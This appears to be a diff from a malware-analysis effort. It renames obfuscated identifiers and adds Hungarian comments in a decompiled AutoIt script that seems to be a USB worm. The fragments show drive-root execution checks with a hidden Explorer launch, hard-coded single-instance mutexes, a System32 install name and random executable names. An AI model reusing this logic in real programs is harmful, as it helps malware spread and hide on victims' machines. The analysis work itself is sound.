@@ -1034,39 +1034,43 @@ Func Fn008E()
 	EndSelect
 EndFunc
 
-Func Fn008F($Arg00, $ArgOpt01 = 0)
-	Local Const $Var027A = 0x00B7 ; 183
-	Local Const $Var027B = 1
-	Local $Local0016 = 0
+Func CreateMutex($MutexName, $ArgOpt01 = 0)
+	Local Const $ErrorCode = 0x00B7 ; 183
+	Local Const $SecurityDescriptorRevision = 1
+	Local $DllStruct2Pointer = 0
 	If BitAND($ArgOpt01, 2) Then
-		Local $Local0017 = DllStructCreate("dword[5]")
-		Local $Local0018 = DllStructGetPtr($Local0017)
-		Local $Local000F = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "ptr", $Local0018, "dword", $Var027B)
+		Local $DllStruct = DllStructCreate("dword[5]")
+		Local $DllStructPointer = DllStructGetPtr($DllStruct)
+		Local $SecurityDescriptorCreated = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "ptr", $DllStructPointer, "dword", $SecurityDescriptorRevision)
 		If @error Then Return SetError(@error, @extended, 0)
-		If $Local000F[0] Then
-			$Local000F = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "ptr", $Local0018, "bool", 1, "ptr", 0, "bool", 0)
+		If $SecurityDescriptorCreated[0] Then
+			$SecurityDescriptorCreated = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "ptr", $DllStructPointer, "bool", 1, "ptr", 0, "bool", 0)
 			If @error Then Return SetError(@error, @extended, 0)
-			If $Local000F[0] Then
-				Local $Local0019 = DllStructCreate($Var0279)
-				DllStructSetData($Local0019, 1, DllStructGetSize($Local0019))
-				DllStructSetData($Local0019, 2, $Local0018)
-				DllStructSetData($Local0019, 3, 0)
-				$Local0016 = DllStructGetPtr($Local0019)
+			If $SecurityDescriptorCreated[0] Then
+				; Global Const $MutexDllStruct = "dword Length;ptr Descriptor;bool InheritHandle"
+        Local $DllStruct2 = DllStructCreate($MutexDllStruct)
+				DllStructSetData($DllStruct2, 1, DllStructGetSize($DllStruct2))
+				DllStructSetData($DllStruct2, 2, $DllStructPointer)
+				DllStructSetData($DllStruct2, 3, 0)
+				$DllStruct2Pointer = DllStructGetPtr($DllStruct2)
 			EndIf
 		EndIf
 	EndIf
-	Local $Local001A = DllCall("kernel32.dll", "handle", "CreateMutexW", "ptr", $Local0016, "bool", 1, "wstr", $Arg00)
+
+	Local $MutexHandle = DllCall("kernel32.dll", "handle", "CreateMutexW", "ptr", $DllStruct2Pointer, "bool", 1, "wstr", $MutexName)
 	If @error Then Return SetError(@error, @extended, 0)
-	Local $Local001B = DllCall("kernel32.dll", "dword", "GetLastError")
+
+	Local $ResultError = DllCall("kernel32.dll", "dword", "GetLastError")
 	If @error Then Return SetError(@error, @extended, 0)
-	If $Local001B[0] = $Var027A Then
+
+	If $ResultError[0] = $ErrorCode Then
 		If BitAND($ArgOpt01, 1) Then
-			Return SetError($Local001B[0], $Local001B[0], 0)
+			Return SetError($ResultError[0], $ResultError[0], 0)
 		Else
 			Exit -1
 		EndIf
 	EndIf
-	Return $Local001A[0]
+	Return $MutexHandle[0]
 EndFunc
 
 Func Fn0090($Arg00, ByRef $ArgRef01, ByRef $ArgRef02, ByRef $ArgRef03)
@@ -5340,7 +5344,7 @@ EndFunc
 Global Const $Version[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
 Global Const $Var024C = 1, $Var024D = 2
 Global Const $Var0278 = "long X;long Y"
-Global Const $Var0279 = "dword Length;ptr Descriptor;bool InheritHandle"
+Global Const $MutexDllStruct = "dword Length;ptr Descriptor;bool InheritHandle"
 
 Global Const $Var027C = 2
 Global Const $Var027D = Ptr(-1)
@@ -5428,6 +5432,7 @@ Opt("TrayMenuMode", 1)
 
 ; ablak címének beállítása egy 8 és 20 közötti véletlen egész számra
 AutoItWinSetTitle(Fn00BA(Random(8, 0x0014, 1)))
+
 $ExeName1 = "cftuon.exe"
 $ProcessName1 = "cftuon"
 $ExeName2 = "cftu.exe"
@@ -5439,20 +5444,24 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
   Run(@ComSpec & " /c " & "explorer " & @ScriptDir, "", @SW_HIDE)
 	If @error Then
 	EndIf
-	; 3000 ms = 3 s
+	; alvás 3000 ms = 3 s hosszan
   Sleep(0x0BB8)
-	If Fn008F("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
+  ; ha a györkérből fut, akkor "981dsaf81wae98f19c8v98r1aeg1" névvel hoz létre mutex-et
+	If CreateMutex("981dsaf81wae98f19c8v98r1aeg1", 1) = 0 Then
 		Exit
 	EndIf
 EndIf
+
+; ha a Windows\System32 mappából fut, akkor "c9d5s169d5f19581g19s8g1g" névvel hoz létre mutex-et
 If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $ExeName1 Then
-	If Fn008F("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
+	If CreateMutex("c9d5s169d5f19581g19s8g1g", 1) = 0 Then
 		Exit
 	EndIf
 EndIf
 If FileExists("95a1sd.xx") Then
-	$Var0290 = FileRead("95a1sd.xx")
-	If @AutoItExe = $Var0290 Then
+	$RunnableScript = FileRead("95a1sd.xx")
+	; @AutoItExe = az aktuálisan futó AutoIt script elérési útja és fájlneve
+  If @AutoItExe = $RunnableScript Then
 		FileWrite("vvfd", "")
 		Exit
 	EndIf
@@ -5479,6 +5488,7 @@ $Var02A3 = "View files"
 $Var02A4 = ""
 $Var02A5 = "-"
 $Var02A6 = "-"
+; 6 karakter hosszú véletlen elnevezésű exe
 $Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
 $Var02A8 = $Var02A7
 $Var02A9 = $Var02A7
@@ -5487,7 +5497,7 @@ $Var02AB = 0
 $Var02AC = 0
 
 $Var02B0 = 0
-$Var02B1 = 0x007F
+$Var02B1 = 0x007F ;127
 $Var02B2 = 0
 $Var02B3 = 0
 $Var02B4 = 1
@@ -5678,7 +5688,7 @@ EndIf
 If @ScriptDir = @SystemDir Then
 EndIf
 If @ScriptDir = @SystemDir Then
-	If Fn008F("df8g1sdf68g18er1g8re16", 1) = 0 Then
+	If CreateMutex("df8g1sdf68g18er1g8re16", 1) = 0 Then
 		Exit
 	EndIf
 	Fn00EB()
